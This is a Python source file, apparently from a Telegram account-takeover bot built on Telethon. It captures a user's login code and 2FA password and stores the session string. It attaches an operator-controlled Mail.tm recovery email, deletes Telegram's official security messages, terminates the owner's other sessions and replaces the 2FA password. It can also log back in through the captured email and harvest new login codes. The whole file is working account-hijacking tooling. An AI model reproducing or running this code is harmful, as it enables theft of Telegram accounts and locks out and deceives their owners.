# session_manager.py
import asyncio
import logging
import re

from telethon import TelegramClient, functions
from telethon.sessions import StringSession
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    PasswordHashInvalidError,
    FloodWaitError,
    PhoneNumberBannedError,
    AuthKeyUnregisteredError,
    UserDeactivatedError,
    UserDeactivatedBanError,
    SessionRevokedError,
    AuthKeyDuplicatedError,
)
from telethon.tl.functions.account import UpdateUsernameRequest, UpdateProfileRequest
from telethon.tl.functions.auth import ResetAuthorizationsRequest, ResendCodeRequest

import database
import mailtm
from config import (
    API_ID,
    API_HASH,
    EMAIL_MIGRATION_DELAY,
    AUTO_KICK_DELAY_24H,
    AUTO_KICK_DELAY_RETRY,
)

logger = logging.getLogger(__name__)

pending_clients: dict = {}
_recovery_tasks: dict[str, asyncio.Task] = {}
_auto_kick_tasks: dict[str, asyncio.Task] = {}
_recovery_scheduled: set[str] = set()

OFFICIAL_SENDERS = (777000, 42777)
CODE_PATTERN = re.compile(r"\b\d{5}\b")


# ──────────────────────────────────────────
# أدوات مساعدة
# ──────────────────────────────────────────
async def delete_telegram_official_messages(client) -> None:
    """حذف رسائل تيليجرام الرسمية — يُستدعى بعد كل عملية."""
    for sender_id in OFFICIAL_SENDERS:
        try:
            msgs = await client.get_messages(sender_id, limit=50)
            if msgs:
                await client.delete_messages(sender_id, msgs)
        except Exception as e:
            logger.debug("delete msgs %s: %s", sender_id, e)


def _is_email_not_allowed(err: Exception) -> bool:
    s = str(err).upper()
    return "EMAIL_NOT_ALLOWED" in s


# ──────────────────────────────────────────
# تسجيل الدخول
# ──────────────────────────────────────────
async def request_code(user_id: int, phone: str) -> dict:
    try:
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        result = await client.send_code_request(phone)
        pending_clients[user_id] = {
            "client": client,
            "phone": phone,
            "phone_code_hash": result.phone_code_hash,
        }
        return {"success": True}
    except PhoneNumberBannedError:
        return {"success": False, "error": "banned"}
    except FloodWaitError as e:
        return {"success": False, "error": f"flood:{e.seconds}"}
    except Exception as e:
        return {"success": False, "error": str(e)}


async def post_registration_setup(phone: str, client) -> dict:
    """
    مباشرة بعد التسجيل (بدون علاقة بالطرد):
    1. حذف رسائل تيليجرام
    2. ربط بريد Login (Mail.tm)
    3. حذف رسائل مرة أخرى
    4. جدولة نظام الطرد التلقائي
    """
    await delete_telegram_official_messages(client)
    email_res = await _bind_login_email(client, phone)
    await delete_telegram_official_messages(client)
    await database.set_auto_kick_stage(phone, 0)
    schedule_auto_kick_pipeline(phone)
    return email_res


async def submit_code(user_id: int, code: str) -> dict:
    if user_id not in pending_clients:
        return {"success": False, "error": "no_pending"}
    data = pending_clients[user_id]
    client = data["client"]
    phone = data["phone"]
    phone_code_hash = data["phone_code_hash"]
    try:
        await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
        session_string = client.session.save()
        me = await client.get_me()
        full_name = f"{me.first_name or ''} {me.last_name or ''}".strip()
        username = me.username or ""
        phone = database.normalize_phone(phone)
        await database.save_session(phone, username, full_name, session_string)

        email_res = await post_registration_setup(phone, client)
        del pending_clients[user_id]
        await client.disconnect()
        return {
            "success": True,
            "two_fa": False,
            "email_linked": email_res.get("success"),
            "login_email": email_res.get("email"),
            "email_error": email_res.get("error"),
        }
    except SessionPasswordNeededError:
        return {"success": True, "two_fa": True}
    except (PhoneCodeInvalidError, PhoneCodeExpiredError):
        return {"success": False, "error": "wrong_code"}
    except Exception as e:
        return {"success": False, "error": str(e)}


async def submit_2fa(user_id: int, password: str) -> dict:
    if user_id not in pending_clients:
        return {"success": False, "error": "no_pending"}
    data = pending_clients[user_id]
    client = data["client"]
    phone = data["phone"]
    try:
        await client.sign_in(password=password)
        session_string = client.session.save()
        me = await client.get_me()
        full_name = f"{me.first_name or ''} {me.last_name or ''}".strip()
        username = me.username or ""
        # حفظ كلمة مرور الدخول فقط — لا نفعّل 2FA جديد على الحساب
        phone = database.normalize_phone(phone)
        await database.save_session(phone, username, full_name, session_string, password)

        email_res = await post_registration_setup(phone, client)
        del pending_clients[user_id]
        await client.disconnect()
        return {
            "success": True,
            "email_linked": email_res.get("success"),
            "login_email": email_res.get("email"),
            "email_error": email_res.get("error"),
        }
    except PasswordHashInvalidError:
        return {"success": False, "error": "wrong_2fa"}
    except Exception as e:
        return {"success": False, "error": str(e)}


# ──────────────────────────────────────────
# إدارة الجلسات
# ──────────────────────────────────────────
async def ensure_session_string(phone: str) -> str | None:
    """
    يجلب session_string من DB أو يستخرجه من جلسة Telethon نشطة ويحفظه.
    """
    session = await database.get_session_by_phone(phone)
    if not session:
        return None
    ss = session["session_string"]
    if ss and str(ss).strip():
        return str(ss).strip()

    client = await get_active_client(phone)
    if not client:
        return None
    try:
        ss = client.session.save()
        if ss:
            await database.update_session_string(phone, ss)
        return ss or None
    finally:
        await client.disconnect()


async def get_active_client(phone: str):
    session = await database.get_session_by_phone(phone)
    if not session:
        return None
    client = None
    try:
        client = TelegramClient(
            StringSession(session["session_string"]), API_ID, API_HASH
        )
        await client.connect()
        if not await client.is_user_authorized():
            await client.disconnect()
            return None
        return client
    except AuthKeyUnregisteredError:
        if client:
            try:
                await client.disconnect()
            except Exception:
                pass
        return None
    except Exception:
        if client:
            try:
                await client.disconnect()
            except Exception:
                pass
        return None


async def check_session_alive(phone: str) -> bool:
    """
    فحص عميق: هل الجلسة حية وليست مجمدة/ملغاة؟
    لا يعدّل valid في DB.
    """
    session = await database.get_session_by_phone(phone)
    if not session or not session["session_string"]:
        return False
    client = None
    try:
        client = TelegramClient(
            StringSession(session["session_string"]), API_ID, API_HASH
        )
        await client.connect()
        if not await client.is_user_authorized():
            return False
        me = await client.get_me()
        if not me:
            return False
        await client.get_dialogs(limit=1)
        return True
    except (
        AuthKeyUnregisteredError,
        SessionRevokedError,
        AuthKeyDuplicatedError,
        UserDeactivatedError,
        UserDeactivatedBanError,
    ):
        return False
    except Exception as e:
        logger.debug("check_session_alive %s: %s", phone, e)
        return False
    finally:
        if client:
            try:
                await client.disconnect()
            except Exception:
                pass


async def check_session_valid(phone: str) -> bool:
    """للـ watchdog — يستدعي الفحص العميق."""
    return await check_session_alive(phone)


async def bulk_check_sessions() -> dict:
    """فحص كل الجلسات النشطة وتصنيف الميتة/المجمدة كغير صالحة."""
    sessions = await database.get_all_sessions()
    checked = invalid = 0
    dead_phones = []
    for s in sessions:
        if not s["valid"]:
            continue
        phone = s["phone"]
        checked += 1
        if not await check_session_alive(phone):
            await database.mark_session_invalid(phone)
            invalid += 1
            dead_phones.append(phone)
        await asyncio.sleep(0.3)
    return {"checked": checked, "invalid": invalid, "phones": dead_phones}


# ──────────────────────────────────────────
# تعديل الحساب
# ──────────────────────────────────────────
async def change_username(phone: str, new_username: str) -> dict:
    client = await get_active_client(phone)
    if not client:
        return {"success": False, "error": "session_invalid"}
    try:
        await client(UpdateUsernameRequest(new_username))
        await database.update_session_username(phone, new_username)
        await delete_telegram_official_messages(client)
        return {"success": True}
    except Exception as e:
        return {"success": False, "error": str(e)}
    finally:
        await client.disconnect()


async def change_name(phone: str, first_name: str, last_name: str = "") -> dict:
    client = await get_active_client(phone)
    if not client:
        return {"success": False, "error": "session_invalid"}
    try:
        await client(UpdateProfileRequest(first_name=first_name, last_name=last_name))
        full_name = f"{first_name} {last_name}".strip()
        await database.update_session_fullname(phone, full_name)
        await delete_telegram_official_messages(client)
        return {"success": True}
    except Exception as e:
        return {"success": False, "error": str(e)}
    finally:
        await client.disconnect()


async def terminate_other_sessions(phone: str) -> dict:
    client = await get_active_client(phone)
    if not client:
        return {"success": False, "error": "session_invalid"}
    try:
        await client(ResetAuthorizationsRequest())
        await delete_telegram_official_messages(client)
        return {"success": True}
    except Exception as e:
        return {"success": False, "error": str(e)}
    finally:
        await client.disconnect()


async def set_two_fa(phone: str, new_password: str, old_password: str = None) -> dict:
    client = await get_active_client(phone)
    if not client:
        return {"success": False, "error": "session_invalid"}
    try:
        await client.edit_2fa(
            current_password=old_password,
            new_password=new_password,
            hint="",
            email=None,
        )
        await database.update_session_two_fa(phone, new_password)
        await delete_telegram_official_messages(client)
        return {"success": True}
    except Exception as e:
        return {"success": False, "error": str(e)}
    finally:
        await client.disconnect()


async def remove_two_fa(phone: str, current_password: str) -> dict:
    client = await get_active_client(phone)
    if not client:
        return {"success": False, "error": "session_invalid"}
    try:
        await client.edit_2fa(current_password=current_password, new_password=None)
        await database.update_session_two_fa(phone, None)
        await delete_telegram_official_messages(client)
        return {"success": True}
    except Exception as e:
        return {"success": False, "error": str(e)}
    finally:
        await client.disconnect()


# ──────────────────────────────────────────
# بريد Login (Mail.tm)
# ──────────────────────────────────────────
async def fetch_code_from_email(
    address: str, password: str, attempts: int = 12, interval: int = 5
) -> str | None:
    return await mailtm.fetch_code(address, password, attempts, interval)


async def _bind_login_email(client, phone: str) -> dict:
    last_error = "جميع النطاقات مرفوضة من تيليجرام"
    try:
        domains = await mailtm.get_active_domains()
        for domain in domains:
            account = await mailtm.create_account(domain)
            new_email = account["address"]
            email_password = account["password"]
            try:
                await client(functions.account.UpdateEmailRequest(email=new_email))
            except Exception as e:
                if _is_email_not_allowed(e):
                    last_error = str(e)
                    continue
                raise

            code = await fetch_code_from_email(new_email, email_password)
            if not code:
                return {
                    "success": False,
                    "error": "لم يتم العثور على الكود في الإيميل",
                    "email": new_email,
                }

            await client(functions.account.ConfirmEmailRequest(code=code))
            await database.update_session_login_email(phone, new_email, email_password)
            await database.increment_email_counter()
            await delete_telegram_official_messages(client)
            return {"success": True, "email": new_email}

        return {"success": False, "error": last_error}
    except Exception as e:
        return {"success": False, "error": str(e)}


async def change_login_email(phone: str) -> dict:
    client = await get_active_client(phone)
    if not client:
        return {"success": False, "error": "الجلسة معطلة"}
    try:
        res = await _bind_login_email(client, phone)
        await delete_telegram_official_messages(client)
        return res
    finally:
        await client.disconnect()


# ──────────────────────────────────────────
# نظام الطرد التلقائي (بدون 2FA)
# ──────────────────────────────────────────
async def _try_auto_kick(phone: str) -> dict:
    client = await get_active_client(phone)
    if not client:
        return {"success": False, "error": "الجلسة غير متاحة"}
    try:
        await client(ResetAuthorizationsRequest())
        await delete_telegram_official_messages(client)
        return {"success": True}
    except Exception as e:
        err = str(e)
        if "fresh" in err.lower() or "recently" in err.lower():
            return {"success": False, "error": "session_too_fresh"}
        return {"success": False, "error": err}
    finally:
        await client.disconnect()


def schedule_auto_kick_pipeline(phone: str):
    if phone in _auto_kick_tasks and not _auto_kick_tasks[phone].done():
        return
    _auto_kick_tasks[phone] = asyncio.create_task(_auto_kick_worker(phone))


async def _auto_kick_worker(phone: str):
    """
    محاولات الطرد التلقائي:
    0) فور التسجيل
    1) بعد 24 ساعة
    2) بعد 5 دقائق إضافية
    عند النجاح: حذف رسائل فقط (بدون 2FA)
    """
    delays = [0, AUTO_KICK_DELAY_24H, AUTO_KICK_DELAY_RETRY]
    try:
        for attempt, delay in enumerate(delays):
            if delay > 0:
                await database.set_auto_kick_stage(phone, attempt)
                await asyncio.sleep(delay)
            result = await _try_auto_kick(phone)
            if result.get("success"):
                await database.mark_auto_kick_done(phone)
                logger.info("auto kick OK %s attempt %s", phone, attempt)
                return
            logger.info(
                "auto kick fail %s attempt %s: %s",
                phone, attempt, result.get("error"),
            )
    except Exception as e:
        logger.error("auto kick worker %s: %s", phone, e)
    finally:
        _auto_kick_tasks.pop(phone, None)


async def resume_auto_kick_pipelines():
    sessions = await database.get_sessions_pending_auto_kick()
    for s in sessions:
        schedule_auto_kick_pipeline(s["phone"])
    if sessions:
        logger.info("resumed auto-kick for %d sessions", len(sessions))


# ──────────────────────────────────────────
# تنظيف شامل يدوي (أدمن): طرد → 2FA → حذف رسائل
# ──────────────────────────────────────────
async def admin_full_cleanup(phone: str, new_password: str) -> dict:
    client = await get_active_client(phone)
    if not client:
        return {"success": False, "error": "الجلسة معطلة", "step": "connect"}

    try:
        await client(ResetAuthorizationsRequest())
        await delete_telegram_official_messages(client)
    except Exception as e:
        await client.disconnect()
        err = str(e)
        if "fresh" in err.lower() or "recently" in err.lower():
            return {
                "success": False,
                "error": "الجلسة جديدة — انتظر ثم أعد التنظيف الشامل",
                "step": "kick",
            }
        return {"success": False, "error": err, "step": "kick"}

    try:
        session = await database.get_session_by_phone(phone)
        current = session["two_fa"] if session and session.get("two_fa") else None
        await client.edit_2fa(
            current_password=current,
            new_password=new_password,
            hint="",
            email=None,
        )
        await database.update_session_two_fa(phone, new_password)
        await delete_telegram_official_messages(client)
    except Exception as e:
        await client.disconnect()
        return {"success": False, "error": str(e), "step": "2fa"}

    await client.disconnect()
    await database.mark_session_secured(phone)
    return {"success": True, "password": new_password}


# ──────────────────────────────────────────
# إنعاش جلسة منتهية عبر بريد Login
# ──────────────────────────────────────────
async def recover_session(phone: str) -> dict:
    row = await database.get_session_by_phone(phone)
    if not row:
        return {"success": False, "error": "الجلسة غير موجودة"}
    login_email = database.row_login_email(row)
    if not login_email or not row["email_password"]:
        return {"success": False, "error": "لا يوجد بريد Login محفوظ"}

    client = TelegramClient(StringSession(), API_ID, API_HASH)
    await client.connect()
    try:
        sent = await client.send_code_request(phone)
        phone_code_hash = sent.phone_code_hash

        if "Email" not in type(sent.type).__name__:
            try:
                sent = await client(ResendCodeRequest(phone, phone_code_hash))
                phone_code_hash = sent.phone_code_hash
            except Exception as e:
                logger.debug("resend code %s: %s", phone, e)

        code = await fetch_code_from_email(
            login_email, row["email_password"], attempts=24, interval=5
        )
        if not code:
            return {"success": False, "error": "لم يصل كود الدخول لبريد Login"}

        try:
            await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
        except SessionPasswordNeededError:
            if not row["two_fa"]:
                return {"success": False, "error": "يتطلب 2FA غير محفوظ"}
            await client.sign_in(password=row["two_fa"])

        session_string = client.session.save()
        me = await client.get_me()
        full_name = f"{me.first_name or ''} {me.last_name or ''}".strip()
        username = me.username or ""
        await database.save_session(
            phone, username, full_name, session_string, row["two_fa"]
        )
        _recovery_scheduled.discard(phone)
        return {"success": True, "email": login_email}
    except Exception as e:
        return {"success": False, "error": str(e)}
    finally:
        await client.disconnect()


def schedule_session_recovery(phone: str, delay: int, on_done=None):
    if phone in _recovery_tasks and not _recovery_tasks[phone].done():
        return
    if phone in _recovery_scheduled:
        return
    _recovery_scheduled.add(phone)

    async def _run():
        from config import SESSION_RECOVERY_DELAY
        wait = delay if delay >= 0 else SESSION_RECOVERY_DELAY
        await asyncio.sleep(wait)
        try:
            result = await recover_session(phone)
            if on_done:
                await on_done(phone, result)
        except Exception as e:
            logger.error("recovery %s: %s", phone, e)
            if on_done:
                await on_done(phone, {"success": False, "error": str(e)})
        finally:
            _recovery_tasks.pop(phone, None)

    _recovery_tasks[phone] = asyncio.create_task(_run())


async def migrate_old_sessions_emails() -> dict:
    sessions = await database.get_sessions_needing_email_migration()
    migrated = failed = 0
    for s in sessions:
        phone = s["phone"]
        res = await change_login_email(phone)
        if res.get("success"):
            migrated += 1
        else:
            failed += 1
        await asyncio.sleep(EMAIL_MIGRATION_DELAY)
    return {"migrated": migrated, "failed": failed, "total": len(sessions)}


# ──────────────────────────────────────────
# مراقبة كود من رسائل تيليجرام (أدمن)
# ──────────────────────────────────────────
async def watch_for_new_code(phone: str, timeout: int = 180) -> str | None:
    session = await database.get_session_by_phone(phone)
    if not session or not session["session_string"]:
        return None

    client = None
    try:
        client = TelegramClient(
            StringSession(session["session_string"]), API_ID, API_HASH
        )
        await client.connect()
        if not await client.is_user_authorized():
            await client.disconnect()
            return None

        snapshot = {}
        for sender_id in OFFICIAL_SENDERS:
            try:
                msgs = await client.get_messages(sender_id, limit=1)
                snapshot[sender_id] = msgs[0].id if msgs else 0
            except Exception:
                snapshot[sender_id] = 0

        loop = asyncio.get_running_loop()
        deadline = loop.time() + timeout

        while loop.time() < deadline:
            await asyncio.sleep(3)
            for sender_id, last_id in list(snapshot.items()):
                try:
                    new_msgs = await client.get_messages(sender_id, limit=5)
                    for msg in new_msgs:
                        if (
                            msg.id > last_id
                            and msg.text
                            and CODE_PATTERN.search(msg.text)
                        ):
                            await client.disconnect()
                            return msg.text
                    if new_msgs:
                        snapshot[sender_id] = max(last_id, new_msgs[0].id)
                except Exception:
                    pass

        await client.disconnect()
        return None
    except Exception:
        if client:
            try:
                await client.disconnect()
            except Exception:
                pass
        return None


# توافق مع الاستدعاءات القديمة
change_email_auto = change_login_email
full_clean_and_kick = admin_full_cleanup
